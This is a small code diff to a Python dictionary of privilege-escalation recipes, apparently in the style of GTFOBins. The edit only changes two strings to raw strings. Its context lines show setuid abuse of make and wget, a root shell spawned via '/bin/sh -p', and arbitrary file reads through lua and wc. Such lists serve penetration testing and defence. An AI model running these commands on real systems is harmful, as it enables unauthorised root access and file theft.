@@ -549,7 +549,7 @@ commands = {
         lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
         """,
 
-    "make": """make:
+    "make": r"""make:
         sudo install -m =xs $(which make) .
         COMMAND='/bin/sh -p'
         ./make -s --eval=$'x:\n\t-'"$COMMAND"
@@ -1155,7 +1155,7 @@ commands = {
         ./wc --files0-from "$LFILE"
         """,
 
-    "wget": """wget:
+    "wget": r"""wget:
         sudo install -m =xs $(which wget) .
         TF=$(mktemp)
         chmod +x $TF
